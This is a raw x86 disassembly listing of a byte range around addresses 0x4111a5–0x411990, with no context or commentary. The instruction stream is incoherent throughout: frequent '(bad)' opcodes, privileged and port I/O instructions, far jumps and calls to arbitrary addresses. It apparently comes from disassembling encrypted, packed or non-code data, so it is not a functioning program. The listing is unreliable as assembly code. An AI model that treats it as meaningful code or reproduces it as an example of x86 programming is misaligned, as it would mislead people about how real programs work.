  4111a5:	aaa    
  4111a6:	sar    BYTE PTR [eax-0x19d21c3e],1
  4111ac:	sar    BYTE PTR [eax+eiz*2],1
  4111af:	pusha  
  4111b0:	sbb    esi,DWORD PTR [edi+0xcc29fb8]
  4111b6:	mov    ?,edx
  4111b8:	ins    BYTE PTR es:[edi],dx
  4111b9:	(bad)  
  4111ba:	or     al,0x83
  4111bc:	outs   dx,DWORD PTR ds:[esi]
  4111bd:	cmp    al,0xb
  4111bf:	into   
  4111c0:	inc    ebp
  4111c1:	aam    0x6a
  4111c3:	sub    eax,0xc2776667
  4111c8:	dec    edi
  4111c9:	xchg   esp,eax
  4111ca:	jg     0x4111a5
  4111cc:	push   cs
  4111cd:	sbb    eax,0xd634447a
  4111d2:	ret    
  4111d3:	test   DWORD PTR ds:0xe12353d,esp
  4111d9:	mov    ah,0xe8
  4111db:	fucomp st(3)
  4111dd:	mov    ecx,0x2a363c9b
  4111e2:	mov    eax,ds:0x4429ebe8
  4111e7:	dec    ebx
  4111e8:	aas    
  4111e9:	div    DWORD PTR [eax+0x67]
  4111ec:	lds    esi,FWORD PTR ss:[ebx]
  4111ef:	fcmovnb st,st(4)
  4111f1:	mov    ah,0x15
  4111f3:	inc    ecx
  4111f4:	xor    DWORD PTR [edx],esi
  4111f6:	(bad)  
  4111f7:	bnd jnp 0x411265
  4111fa:	fucomip st,st(6)
  4111fc:	sub    al,0x45
  4111fe:	xor    ecx,ecx
  411200:	icebp  
  411201:	add    ecx,DWORD PTR [edi-0x2d]
  411204:	(bad)  
  411205:	jle    0x41127d
  411207:	push   0xfe063d8a
  41120c:	jo     0x4111f2
  41120e:	and    ebp,DWORD PTR [eax+0x1a]
  411211:	cmp    eax,0x2e9650c0
  411216:	mov    eax,0x143f3805
  41121b:	xchg   edx,eax
  41121c:	inc    esi
  41121d:	ss clc 
  41121f:	addr16 (bad) 
  411221:	or     al,0x2a
  411223:	jae    0x4111be
  411225:	dec    edi
  411226:	cld    
  411227:	outs   dx,DWORD PTR ds:[esi]
  411228:	and    eax,0xc3b2d14
  41122d:	lds    ebp,FWORD PTR [esi+0x5a27edb8]
  411233:	push   ebp
  411234:	xchg   ebp,eax
  411235:	ins    BYTE PTR es:[edi],dx
  411236:	adc    BYTE PTR [ecx-0x21],ch
  411239:	pop    ss
  41123a:	cmp    eax,DWORD PTR [ecx+0x2d]
  41123d:	repnz mul BYTE PTR [ecx]
  411240:	mov    ch,0xd1
  411242:	inc    eax
  411243:	pop    ebp
  411244:	jbe    0x4112a1
  411246:	mov    WORD PTR [edi-0x63cb7f15],?
  41124c:	icebp  
  41124d:	ror    bl,1
  41124f:	adc    ch,BYTE PTR [ecx+0x29534584]
  411255:	bound  esp,QWORD PTR [ebx+edx*4+0x2b]
  411259:	add    BYTE PTR [edx],bh
  41125b:	xor    ebp,esi
  41125d:	sub    al,0x91
  41125f:	jmp    0x411207
  411261:	fstp   QWORD PTR [edi+0x40]
  411264:	fisttp WORD PTR [eax+0x245a68b1]
  41126a:	push   edx
  41126b:	rcr    DWORD PTR [edx],1
  41126d:	ficomp DWORD PTR [ebx]
  41126f:	test   dh,cl
  411271:	cmp    edi,DWORD PTR [eax]
  411273:	stos   DWORD PTR es:[edi],eax
  411274:	test   al,0x85
  411276:	data16 add BYTE PTR [edx+eax*1+0x18691730],0x3b
  41127f:	push   esi
  411280:	sub    edx,DWORD PTR [ecx+edx*2]
  411283:	push   ss
  411284:	lds    esp,FWORD PTR [ecx+ecx*1]
  411287:	scas   al,BYTE PTR es:[edi]
  411288:	mov    al,cs:0xb18d0742
  41128e:	pop    es
  41128f:	popf   
  411290:	out    0xe4,al
  411292:	and    BYTE PTR [ecx-0x353efa2d],ch
  411298:	xchg   BYTE PTR [edi-0x6b],dh
  41129b:	out    dx,al
  41129c:	(bad)  
  41129e:	or     BYTE PTR [edi],ch
  4112a0:	mov    ch,0xb9
  4112a2:	test   BYTE PTR [edi-0x659ef7e5],dh
  4112a8:	outs   dx,DWORD PTR ds:[esi]
  4112a9:	mov    ds:0xaf297585,eax
  4112ae:	sub    bl,cl
  4112b0:	scas   eax,DWORD PTR es:[edi]
  4112b1:	cs call 0xf4b75731
  4112b7:	cs ret 0xd9f9
  4112bb:	es enter 0x4469,0xa5
  4112c0:	push   edx
  4112c1:	lods   eax,DWORD PTR ds:[esi]
  4112c2:	mov    bh,0x13
  4112c4:	xchg   edi,eax
  4112c5:	fiadd  DWORD PTR [edi]
  4112c7:	fs nop
  4112c9:	sub    al,0x19
  4112cb:	inc    edi
  4112cc:	adc    DWORD PTR [edi+0x5ea582b8],edx
  4112d2:	ror    esp,1
  4112d4:	aam    0x35
  4112d6:	ins    DWORD PTR es:[edi],dx
  4112d7:	push   es
  4112d8:	fimul  WORD PTR [esi]
  4112da:	adc    al,0x73
  4112dc:	xor    ebx,DWORD PTR [edx+0x6289b247]
  4112e2:	mov    ebp,0x414278f5
  4112e7:	(bad)  
  4112e8:	jnp    0x4112aa
  4112ea:	adc    dl,dh
  4112ec:	sbb    al,0xa1
  4112ee:	push   0x9d3c5a1
  4112f3:	xchg   ebp,eax
  4112f4:	adc    bl,BYTE PTR [ebx+edx*2]
  4112f7:	fadd   QWORD PTR [edx]
  4112f9:	dec    esp
  4112fa:	imul   esi,DWORD PTR [ebp+0x17c89fd6],0xffffff95
  411301:	xor    DWORD PTR [esi+0xa3299f1],esp
  411307:	or     eax,0xcc0ae98b
  41130c:	in     al,0x92
  41130e:	mov    bl,0x5f
  411310:	dec    ecx
  411311:	add    al,0x22
  411313:	or     esp,DWORD PTR ds:0xadc0c11d
  411319:	(bad)  
  41131a:	xchg   ebp,eax
  41131b:	fadd   QWORD PTR [eax+0x762ab545]
  411321:	add    al,0x84
  411323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411324:	hlt    
  411325:	popa   
  411326:	xchg   esp,eax
  411327:	push   eax
  411328:	inc    ebp
  411329:	dec    edi
  41132a:	sti    
  41132b:	jns    0x4112e5
  41132d:	add    ah,BYTE PTR [ebp-0x14640a48]
  411333:	and    ebp,edi
  411335:	(bad)  
  411336:	pushf  
  411337:	xchg   ah,cl
  411339:	dec    BYTE PTR [eax-0x3e]
  41133c:	iret   
  41133d:	jno    0x411315
  41133f:	push   cs
  411340:	shl    BYTE PTR [edi+ecx*2-0x753a262e],0x61
  411348:	aad    0xe5
  41134a:	sti    
  41134b:	test   bl,0x99
  41134e:	xchg   ebp,eax
  41134f:	or     al,0xf1
  411351:	inc    ebp
  411352:	adc    al,0xc8
  411354:	shl    BYTE PTR [edx-0x298ffa86],1
  41135a:	sbb    al,0x8e
  41135c:	in     eax,0xff
  41135e:	and    DWORD PTR [eax],ebx
  411360:	cli    
  411361:	data16 jl 0x41131d
  411364:	mov    eax,DWORD PTR [edx]
  411366:	lahf   
  411367:	and    ch,al
  411369:	xor    ecx,esp
  41136b:	fisttp QWORD PTR [ecx-0x5583328a]
  411371:	mov    al,BYTE PTR [ecx+0x23d18de9]
  411377:	jo     0x4113d2
  411379:	jnp    0x4113b9
  41137b:	and    DWORD PTR [ebp-0x1b],esi
  41137e:	popa   
  41137f:	mov    ah,0x77
  411381:	mov    bh,0xc4
  411383:	xor    eax,DWORD PTR [ebx]
  411385:	aas    
  411386:	push   ebx
  411387:	(bad)  
  411388:	bound  esp,QWORD PTR [ebp+0x10]
  41138b:	(bad)  
  41138c:	sub    eax,0x14031a1f
  411391:	in     al,dx
  411392:	shl    eax,1
  411394:	cdq    
  411395:	xlat   BYTE PTR ds:[ebx]
  411396:	popa   
  411397:	jns    0x4113a5
  411399:	aam    0x8e
  41139b:	nop
  41139c:	sahf   
  41139d:	push   ebx
  41139e:	inc    edx
  41139f:	jp     0x411390
  4113a1:	leave  
  4113a2:	jne    0x41140d
  4113a4:	fsubr  QWORD PTR [ebx+ebp*1+0x64]
  4113a8:	cmp    al,0x95
  4113aa:	push   0x4e6bfcef
  4113af:	pop    edx
  4113b1:	cmp    al,al
  4113b3:	loopne 0x41141b
  4113b5:	push   edx
  4113b6:	jae    0x411394
  4113b8:	es retf 
  4113ba:	jmp    0x40a0:0x1140e802
  4113c1:	pop    ecx
  4113c2:	sub    DWORD PTR [ecx+0x45ba1e9f],ebp
  4113c8:	or     eax,0x7a0f8151
  4113cd:	adc    BYTE PTR [ecx],0xca
  4113d0:	jno    0x4113d4
  4113d2:	cmp    DWORD PTR [edi+0x4caeafe0],ebx
  4113d8:	xor    DWORD PTR [esi+0x4c],eax
  4113db:	fist   DWORD PTR [eax+0x6dae2ea6]
  4113e1:	pushf  
  4113e2:	inc    ebx
  4113e3:	scas   al,BYTE PTR es:[edi]
  4113e4:	retf   
  4113e5:	push   0xffffff88
  4113e7:	in     al,dx
  4113e8:	shl    DWORD PTR [esp+ebp*8],0x9b
  4113ec:	jmp    0xb2852be2
  4113f1:	div    BYTE PTR [ecx]
  4113f3:	inc    ebp
  4113f4:	jae    0x41138a
  4113f6:	ss es sbb eax,0x3a7efc9f
  4113fd:	cmp    eax,0xda241325
  411402:	sti    
  411403:	hlt    
  411404:	and    dh,dh
  411406:	in     eax,dx
  411407:	mov    WORD PTR [ebx+0x29d0bc03],ss
  41140d:	push   ss
  41140e:	mov    edi,0x91a1ee09
  411413:	icebp  
  411414:	push   0x6ae7a9f6
  411419:	pop    ecx
  41141a:	pusha  
  41141b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41141c:	int    0x4d
  41141e:	or     DWORD PTR [edx-0x1a],edx
  411421:	pop    ss
  411422:	and    DWORD PTR [edx],ebp
  411424:	ins    BYTE PTR es:[edi],dx
  411425:	(bad)  
  411427:	add    eax,0x4f6be293
  41142c:	ret    
  41142d:	lock cmc 
  41142f:	adc    al,0x31
  411431:	adc    BYTE PTR [esi-0x24afafa8],dl
  411437:	pop    ebx
  411438:	stc    
  411439:	and    DWORD PTR [ebp-0x6e],0x66
  41143d:	std    
  41143e:	adc    DWORD PTR [eax+0x26],eax
  411441:	inc    ebp
  411442:	fsubr  st,st(7)
  411444:	sbb    eax,DWORD PTR [esi]
  411446:	daa    
  411447:	sti    
  411448:	jne    0x411446
  41144a:	(bad)
  41144d:	ror    DWORD PTR ds:0xb56b1032,1
  411453:	mov    ebx,fs
  411455:	jo     0x4114d2
  411457:	add    eax,0xa39772af
  41145c:	outs   dx,BYTE PTR ds:[esi]
  41145d:	push   cs
  41145e:	and    esi,esp
  411460:	or     bl,dh
  411462:	jo     0x411466
  411464:	hlt    
  411465:	add    al,0xbd
  411467:	call   DWORD PTR [edx-0x72472975]
  41146d:	retf   0x5294
  411470:	inc    edx
  411471:	dec    edx
  411472:	dec    ecx
  411473:	addr16 or eax,0xd5e72c9e
  411479:	aaa    
  41147a:	rcl    DWORD PTR [ebx+eiz*1+0x44734f81],cl
  411481:	mov    ecx,DWORD PTR [edi+0x23ade2e8]
  411487:	cmp    BYTE PTR [edi],cl
  411489:	mov    ds:0x64ae6b3b,eax
  41148e:	lds    ecx,FWORD PTR [eax]
  411490:	and    bh,dl
  411492:	(bad)  
  411494:	push   esi
  411495:	mov    ebx,0xa0b35fce
  41149a:	icebp  
  41149b:	or     dl,BYTE PTR [edi-0x566d2de6]
  4114a1:	jecxz  0x41143d
  4114a3:	dec    ebp
  4114a4:	and    BYTE PTR [edi+eiz*1+0x3c],dh
  4114a8:	repz pop ss
  4114aa:	mov    eax,ds:0xe008755b
  4114af:	jmp    0x4114ca
  4114b1:	dec    edi
  4114b2:	pushf  
  4114b3:	int    0x91
  4114b5:	jecxz  0x41143e
  4114b7:	add    edx,ebp
  4114b9:	sbb    al,0x3f
  4114bb:	xchg   esi,eax
  4114bc:	(bad)  
  4114bd:	sbb    al,BYTE PTR [edx+0x6f]
  4114c0:	ret    0xf877
  4114c3:	jne    0x411466
  4114c5:	mov    ds:0x7479d1ea,eax
  4114ca:	jecxz  0x41153d
  4114cc:	mov    ecx,esi
  4114ce:	cwde   
  4114cf:	call   0x9fd8f322
  4114d4:	push   0xbf1ac983
  4114d9:	adc    ebx,DWORD PTR [ecx+0xa]
  4114dc:	push   edi
  4114dd:	push   0x20
  4114df:	stos   BYTE PTR es:[edi],al
  4114e0:	add    ecx,esi
  4114e2:	fdivr  DWORD PTR [edi+ecx*2+0x22]
  4114e6:	sbb    esp,ebx
  4114e8:	loopne 0x411540
  4114ea:	pop    esi
  4114eb:	enter  0x5789,0x22
  4114ef:	call   0xcb1a2a31
  4114f4:	repz scas al,BYTE PTR es:[edi]
  4114f6:	rep outs dx,BYTE PTR ds:[esi]
  4114f8:	dec    edx
  4114f9:	or     al,0xd6
  4114fb:	popa   
  4114fc:	imul   ebp
  4114fe:	repz sub al,0x33
  411501:	scas   al,BYTE PTR es:[edi]
  411502:	mov    ecx,0x973ab1d5
  411507:	out    dx,eax
  411508:	sub    BYTE PTR [esi],dl
  41150a:	out    0xf0,eax
  41150c:	mov    al,ds:0x865d5bd9
  411511:	or     al,BYTE PTR [ecx+0x21]
  411514:	xor    ch,bl
  411516:	popa   
  411517:	popf   
  411518:	pop    ebx
  411519:	xchg   ebx,eax
  41151a:	push   ds
  41151b:	mov    al,0xc9
  41151d:	fadd   st,st(2)
  41151f:	xchg   edi,eax
  411520:	mov    eax,0xdaf679bd
  411525:	leave  
  411526:	xchg   esi,eax
  411527:	test   BYTE PTR [edi],cl
  411529:	jp     0x4114be
  41152b:	mov    dl,0x54
  41152d:	call   0xa5e42c8
  411532:	ret    0xdba2
  411535:	fcmove st,st(4)
  411537:	(bad)  
  411538:	clc    
  411539:	cmp    al,0x9a
  41153b:	cli    
  41153c:	mov    ebp,0x81299d93
  411541:	xchg   ebx,eax
  411542:	pop    esp
  411543:	(bad)  
  411544:	repnz cmp dl,BYTE PTR [ecx+0x4ab9acdc]
  41154b:	addr16 sbb al,0x8b
  41154e:	(bad)  
  41154f:	add    ah,BYTE PTR [edx]
  411551:	lods   eax,DWORD PTR ds:[esi]
  411552:	test   al,0xd9
  411554:	int3   
  411555:	das    
  411556:	mov    bl,0x21
  411558:	int    0xd
  41155a:	xchg   ecx,eax
  41155b:	or     ch,BYTE PTR [edx]
  41155d:	dec    ebp
  41155e:	outs   dx,BYTE PTR ds:[esi]
  41155f:	mov    ah,0x2d
  411561:	sbb    eax,ebp
  411563:	mov    ds:0x9a6850ef,eax
  411568:	adc    al,0x84
  41156a:	sbb    DWORD PTR [esi],edx
  41156c:	sub    BYTE PTR [ebp+0x75],cl
  41156f:	(bad)  
  411570:	shr    DWORD PTR [edx+0x28],cl
  411573:	jae    0x411542
  411575:	mov    BYTE PTR [edx],bl
  411577:	pushf  
  411578:	pop    ds
  411579:	ret    0xadf4
  41157c:	out    dx,eax
  41157d:	out    0x46,al
  41157f:	cwde   
  411580:	pop    edx
  411581:	in     al,0xcf
  411583:	stc    
  411584:	dec    esp
  411585:	push   esp
  411586:	push   edi
  411587:	leave  
  411588:	push   0xffffff82
  41158a:	push   ebp
  41158b:	jae    0x4115b3
  41158d:	sbb    BYTE PTR [ebp-0x5c],dl
  411590:	pop    es
  411591:	js     0x4115a1
  411593:	or     esp,DWORD PTR [ebp-0x80]
  411596:	sbb    DWORD PTR [edx],esi
  411598:	pop    ebx
  411599:	jle    0x411608
  41159b:	pop    edi
  41159c:	xchg   esi,eax
  41159d:	jno    0x411587
  41159f:	jmp    0x97a4:0xebf3c358
  4115a6:	cli    
  4115a7:	and    DWORD PTR [esi-0xb0bb200],edi
  4115ad:	dec    edx
  4115af:	add    al,0x1e
  4115b1:	hlt    
  4115b2:	and    BYTE PTR [esi],0xe0
  4115b5:	ret    0x4ac6
  4115b8:	fwait
  4115b9:	leave  
  4115ba:	jnp    0x41159e
  4115bc:	fstp   QWORD PTR [esi+0x14ecb592]
  4115c2:	outs   dx,BYTE PTR ds:[esi]
  4115c3:	std    
  4115c4:	sub    edi,edx
  4115c6:	mov    cl,cl
  4115c8:	out    0x24,al
  4115ca:	and    edi,DWORD PTR [eax-0x52a50da0]
  4115d0:	das    
  4115d1:	(bad)  
  4115d2:	dec    ebx
  4115d3:	sub    BYTE PTR [eax],0x2e
  4115d6:	push   0x567687a7
  4115db:	mov    cl,al
  4115dd:	adc    dl,dl
  4115df:	xor    eax,0x134043b9
  4115e4:	rcl    DWORD PTR [edi-0x21bbea22],cl
  4115ea:	mov    ebx,DWORD PTR [esi-0x16b2840b]
  4115f0:	test   DWORD PTR [eax-0x2e],ebp
  4115f3:	inc    esp
  4115f4:	(bad)  
  4115f6:	mov    ah,0xb7
  4115f8:	daa    
  4115f9:	mov    esp,0xb8bd7ef6
  4115fe:	inc    edx
  4115ff:	stos   DWORD PTR es:[edi],eax
  411600:	inc    ebp
  411601:	adc    DWORD PTR [edi-0x6818b6b8],0x15
  411608:	cwde   
  411609:	push   es
  41160a:	out    dx,eax
  41160b:	xchg   esi,eax
  41160c:	push   es
  41160d:	out    0xea,eax
  41160f:	fs aas 
  411611:	cld    
  411612:	fiadd  WORD PTR [ebp-0x644b54b5]
  411618:	adc    BYTE PTR [edi+0x7169c327],0x13
  41161f:	lahf   
  411620:	sub    edx,esp
  411622:	scas   eax,DWORD PTR es:[edi]
  411623:	stc    
  411624:	xchg   bh,cl
  411626:	add    ebx,esi
  411628:	or     al,0xd6
  41162a:	std    
  41162b:	hlt    
  41162c:	mov    dh,0x74
  41162e:	jbe    0x41168c
  411630:	cmp    BYTE PTR [edx-0x20],dl
  411633:	xchg   esp,eax
  411634:	sub    BYTE PTR [edi-0x54],0x98
  411638:	das    
  411639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41163a:	mov    cl,0x23
  41163c:	fistp  QWORD PTR [edx+0x7bc0c6bb]
  411642:	fmul   st(4),st
  411644:	pop    esi
  411645:	pop    edi
  411646:	mov    bh,0x2a
  411648:	jmp    0xd3472675
  41164d:	retf   0x6c7c
  411650:	ret    
  411651:	sahf   
  411652:	pop    ebx
  411653:	cmp    BYTE PTR [edi+ebx*4-0x78a4a5de],cl
  41165a:	push   ebp
  41165b:	(bad)  
  41165c:	iret   
  41165d:	neg    DWORD PTR fs:[eax+eax*2]
  411661:	outs   dx,BYTE PTR ds:[esi]
  411662:	adc    ah,BYTE PTR [eax]
  411664:	or     eax,0x7538a190
  411669:	dec    esi
  41166a:	or     eax,DWORD PTR [ecx+0x52]
  41166d:	ror    bl,1
  41166f:	jecxz  0x41160a
  411671:	pop    ss
  411672:	adc    al,0x61
  411674:	fsubr  st(6),st
  411676:	jle    0x411673
  411678:	out    dx,al
  411679:	mov    bl,0x24
  41167b:	xor    esi,DWORD PTR [ecx-0x6aafd276]
  411681:	jno    0x411682
  411683:	ficom  WORD PTR [edi-0x1d0498da]
  411689:	sbb    al,0xb6
  41168b:	ds inc edx
  41168d:	adc    al,0x83
  41168f:	xlat   BYTE PTR ds:[ebx]
  411690:	or     eax,0x65897a53
  411695:	jne    0x411673
  411697:	xchg   edx,eax
  411698:	push   0xa690236f
  41169d:	add    eax,DWORD PTR [ebp-0x1c5902a3]
  4116a3:	push   ebp
  4116a4:	push   esp
  4116a5:	test   BYTE PTR ds:0xfea3b008,0x69
  4116ac:	dec    eax
  4116ad:	in     al,0xa9
  4116af:	sub    ah,bl
  4116b1:	(bad)  [eax-0x57]
  4116b4:	sub    bh,BYTE PTR [eax+edx*4+0x7eec542c]
  4116bb:	mov    ecx,0xc2e363de
  4116c0:	(bad)  
  4116c1:	jb     0x4116be
  4116c3:	sbb    edx,DWORD PTR [ecx+ebp*1+0x7f]
  4116c7:	xchg   ebp,eax
  4116c8:	or     dl,ah
  4116ca:	loop   0x4116a7
  4116cc:	popf   
  4116cd:	icebp  
  4116ce:	mul    eax
  4116d0:	inc    esi
  4116d1:	popf   
  4116d2:	and    DWORD PTR [ecx+ebp*1-0x3b],eax
  4116d6:	out    0x8d,al
  4116d8:	fdivr  st,st(4)
  4116da:	push   es
  4116db:	fist   DWORD PTR ds:0x762ad716
  4116e1:	stc    
  4116e2:	imul   esp
  4116e4:	rol    ebp,1
  4116e6:	repz bound ecx,QWORD PTR [ecx+ebp*1]
  4116ea:	push   esi
  4116eb:	repnz add dl,BYTE PTR [edi+0x63]
  4116ef:	mov    eax,0xff1e42d7
  4116f4:	sub    al,0xb8
  4116f6:	xor    BYTE PTR [esp+ebx*1-0x74],al
  4116fa:	sub    ebp,0x3aa86b76
  411700:	sub    eax,0xcebf9196
  411705:	lods   al,BYTE PTR ds:[esi]
  411706:	xchg   esi,eax
  411707:	sub    eax,0xfd52b43e
  41170d:	xchg   DWORD PTR [ebx],edx
  41170f:	(bad)  
  411711:	dec    esi
  411712:	(bad)  
  411713:	fbld   TBYTE PTR [ecx+0x5bae5576]
  411719:	xchg   edx,eax
  41171a:	scas   eax,DWORD PTR es:[edi]
  41171b:	cmp    dh,al
  41171d:	stc    
  41171e:	xchg   ebx,eax
  41171f:	jmp    0x4116f8
  411721:	iret   
  411722:	(bad)  
  411723:	int3   
  411724:	sub    DWORD PTR [esi-0x59],ebp
  411727:	imul   edx,ebp,0x37
  41172a:	xchg   DWORD PTR [ecx+0x17],ebx
  41172d:	lds    eax,FWORD PTR [ebx+0x59bb933b]
  411733:	add    dh,cl
  411735:	xlat   BYTE PTR ds:[ebx]
  411736:	dec    edx
  411737:	mov    eax,ds:0xd4cefa8d
  41173c:	mov    dl,0x53
  41173e:	je     0x411723
  411740:	cwde   
  411741:	repnz xor DWORD PTR [esi],ebx
  411744:	es sub esp,eax
  411747:	(bad)  [esi]
  411749:	arpl   WORD PTR [edi+0x15e75065],cx
  41174f:	js     0x41175c
  411751:	cmc    
  411752:	fs pushf 
  411754:	xor    al,BYTE PTR [esi-0x1f]
  411757:	leave  
  411758:	and    eax,0xf9a5a140
  41175d:	pop    ds
  41175e:	xchg   edx,eax
  41175f:	div    BYTE PTR [edi+0xbace185]
  411765:	shl    DWORD PTR [ecx],1
  411767:	icebp  
  411768:	adc    DWORD PTR [edi],eax
  41176a:	mov    edi,gs
  41176c:	mov    cs,WORD PTR [edx+ebp*1-0x32]
  411770:	cmp    al,0x44
  411772:	mov    dl,0xeb
  411774:	mov    al,ds:0xc7d26593
  411779:	loope  0x411737
  41177b:	aam    0x9
  41177d:	mov    DWORD PTR [ebx+0x36ee5527],esp
  411783:	arpl   ax,bp
  411785:	and    ah,BYTE PTR [eax+ecx*4+0x73]
  411789:	cdq    
  41178a:	leave  
  41178b:	sub    DWORD PTR [edi+0x1],esp
  41178e:	(bad)  
  41178f:	aam    0x76
  411791:	ds int3 
  411793:	jnp    0x41175c
  411795:	fld    QWORD PTR [esi+0x7b]
  411798:	out    0x13,al
  41179a:	cmp    DWORD PTR [ebp+0x50],ebx
  41179d:	in     al,0x57
  41179f:	inc    eax
  4117a0:	shl    DWORD PTR [esi],cl
  4117a2:	adc    esi,ebp
  4117a4:	xlat   BYTE PTR ds:[ebx]
  4117a5:	daa    
  4117a6:	leave  
  4117a7:	stos   DWORD PTR es:[edi],eax
  4117a8:	adc    DWORD PTR [ebx-0x2b],edi
  4117ab:	xor    ah,0xfd
  4117ae:	psubw  mm3,mm3
  4117b1:	pop    DWORD PTR [edx-0x80]
  4117b4:	(bad)  
  4117b5:	stos   BYTE PTR es:[edi],al
  4117b6:	or     eax,edi
  4117b8:	dec    edi
  4117b9:	sar    BYTE PTR [esi],1
  4117bb:	cwde   
  4117bc:	sub    dl,bl
  4117be:	xor    dh,0x9
  4117c1:	inc    eax
  4117c2:	sar    DWORD PTR [esi],1
  4117c4:	push   0xa3a85f57
  4117c9:	loop   0x4117ec
  4117cb:	lock cmp DWORD PTR es:[ebx-0x16],esp
  4117d0:	cmp    eax,0x155c1b14
  4117d5:	and    bl,dh
  4117d7:	cmp    DWORD PTR [ebp+0x69],ebx
  4117da:	mov    eax,0x52c49d13
  4117df:	adc    al,0xd4
  4117e1:	lea    esi,[eax]
  4117e3:	into   
  4117e4:	mov    ebp,0xc2bfb465
  4117e9:	adc    bh,BYTE PTR [ecx]
  4117eb:	inc    edx
  4117ec:	and    DWORD PTR [ebx-0x53],edi
  4117ef:	sub    ch,0xd8
  4117f2:	or     bl,bl
  4117f4:	aas    
  4117f5:	sti    
  4117f6:	xor    BYTE PTR [ebp-0x1939203a],dl
  4117fc:	add    BYTE PTR [edi],ch
  4117fe:	xchg   edx,eax
  4117ff:	loopne 0x41184d
  411801:	jle    0x41184f
  411803:	in     eax,dx
  411804:	repnz (bad) 
  411806:	xchg   edx,eax
  411807:	imul   DWORD PTR [esi+ebx*1-0x2f7b21e5]
  41180e:	stos   BYTE PTR es:[edi],al
  41180f:	out    0x13,al
  411811:	push   eax
  411812:	mov    esi,0x93d9b000
  411817:	jl     0x41185d
  411819:	(bad)  
  41181a:	call   0xe254f9ba
  41181f:	pusha  
  411820:	or     esi,ebp
  411822:	sbb    edx,edx
  411824:	js     0x4117ae
  411826:	xchg   esp,eax
  411827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411828:	or     DWORD PTR [ebp-0xa],0xe34b9cbe
  41182f:	outs   dx,BYTE PTR ds:[esi]
  411830:	adc    BYTE PTR [edx+0x3e1295e4],0x11
  411837:	retf   
  411838:	aas    
  411839:	inc    eax
  41183a:	cdq    
  41183b:	jle    0x4117ea
  41183d:	xor    edi,DWORD PTR [ebx-0x24b11a81]
  411843:	and    bl,ah
  411845:	ret    
  411846:	test   esp,0x9ed4f33a
  41184c:	dec    eax
  41184d:	cmp    BYTE PTR [edx-0x1e],dl
  411850:	dec    edx
  411851:	dec    edx
  411852:	dec    ecx
  411853:	add    DWORD PTR [edx+0x71],ebp
  411856:	int    0x2e
  411858:	cld    
  411859:	fwait
  41185a:	or     ebx,DWORD PTR [ecx-0x12f3ebb]
  411860:	into   
  411861:	jmp    0x36ef:0x4365e6bf
  411868:	adc    eax,DWORD PTR [esi+0x2a9321a3]
  41186e:	xchg   edi,eax
  41186f:	fisubr WORD PTR [esi-0x57]
  411872:	out    0xc3,eax
  411874:	fcmovb st,st(0)
  411876:	sub    DWORD PTR [ebp+0x4],esi
  411879:	or     al,0x82
  41187b:	popa   
  41187c:	test   BYTE PTR [edx],0x83
  41187f:	mov    ch,0x8e
  411881:	jb     0x411883
  411883:	pop    ebp
  411884:	dec    edx
  411885:	xor    eax,0x13c2ddd6
  41188a:	call   0x1e00d197
  41188f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411890:	pop    eax
  411891:	je     0x411865
  411893:	loop   0x411907
  411895:	imul   eax,ebp,0x44
  411898:	ja     0x411822
  41189a:	jle    0x4118bc
  41189c:	mov    cl,0xcb
  41189e:	fadd   st,st(0)
  4118a0:	pusha  
  4118a1:	sub    al,dh
  4118a3:	repz fdivr DWORD PTR [edx-0x79]
  4118a7:	leave  
  4118a8:	lock gs int 0x47
  4118ac:	ja     0x4118df
  4118ae:	xchg   BYTE PTR [esi+ecx*2],cl
  4118b1:	push   esp
  4118b2:	push   cs
  4118b3:	imul   edx,DWORD PTR [ebx+eax*2],0x28
  4118b7:	adc    bh,bl
  4118b9:	jecxz  0x4118d1
  4118bb:	mov    ebx,0xa802c476
  4118c0:	or     ebp,ebp
  4118c2:	mov    DWORD PTR [ebx-0x623e79f8],eax
  4118c8:	ds push 0x3e
  4118cb:	or     al,0xca
  4118cd:	leave  
  4118ce:	test   eax,ebx
  4118d0:	mov    esp,0xae9ad96e
  4118d5:	in     eax,dx
  4118d6:	push   ebp
  4118d7:	mov    dl,BYTE PTR ds:0x2fe061a4
  4118dd:	adc    eax,0x99e14b40
  4118e2:	or     DWORD PTR [eax-0x7d],0x507e8240
  4118e9:	sbb    eax,DWORD PTR [eax-0x15]
  4118ec:	mov    ah,0xc8
  4118ee:	xor    bl,BYTE PTR [ebp+0x4]
  4118f1:	cmp    dl,cl
  4118f3:	call   0xedc13567
  4118f8:	mov    BYTE PTR [esi+ecx*8+0x4771c75],cl
  4118ff:	repnz out 0x48,eax
  411902:	mov    bh,0xde
  411904:	sbb    BYTE PTR [edx+0x5a48ecce],0x32
  41190b:	inc    ebp
  41190c:	sub    eax,0x941c264d
  411911:	push   0x8c93ddee
  411916:	lds    ebp,FWORD PTR [ebp-0x1b88d7fc]
  41191c:	int3   
  41191d:	mov    bl,BYTE PTR [ecx+0x19b8af3e]
  411923:	sub    al,0x7b
  411925:	push   0xffffff95
  411927:	add    bl,BYTE PTR [ebp*2+0x3b3f8e42]
  41192e:	adc    BYTE PTR [ecx-0x46b3e450],0xd8
  411935:	cli    
  411936:	add    dl,BYTE PTR [ebp-0x28]
  411939:	sti    
  41193a:	mov    DWORD PTR [edi-0x4aa8aa86],edx
  411940:	mov    ds:0x15047209,eax
  411945:	jne    0x4118f0
  411947:	cmp    BYTE PTR [edx-0x7ac00a81],cl
  41194d:	add    eax,0x3fad99a7
  411952:	add    eax,0xee8677a9
  411957:	sbb    BYTE PTR [esi+ecx*1-0x3a],ah
  41195b:	jp     0x411990
  41195d:	xor    al,BYTE PTR [ebx-0x709c8be1]
  411963:	shr    DWORD PTR [ebx-0x30d21fca],1
  411969:	in     eax,dx
  41196a:	jg     0x411907
  41196c:	sbb    BYTE PTR [eax],dh
  41196e:	lods   al,BYTE PTR ds:[esi]
  41196f:	pop    eax
  411970:	loopne 0x4119e6
  411972:	out    dx,eax
  411973:	dec    esi
  411974:	mov    al,0xe3
  411976:	cmc    
  411977:	add    al,0x89
  411979:	mov    ecx,0xc566152d
  41197e:	loopne 0x4119a6
  411980:	test   BYTE PTR [ebp+0x6a],dl
  411983:	int    0x7a
  411985:	xchg   DWORD PTR [edi-0x51],ebx
  411988:	or     al,0xfb
  41198a:	mov    ah,0x26
  41198c:	jae    0x411952
  41198e:	jne    0x4119b4
  411990:	test   eax,0x965d9af7
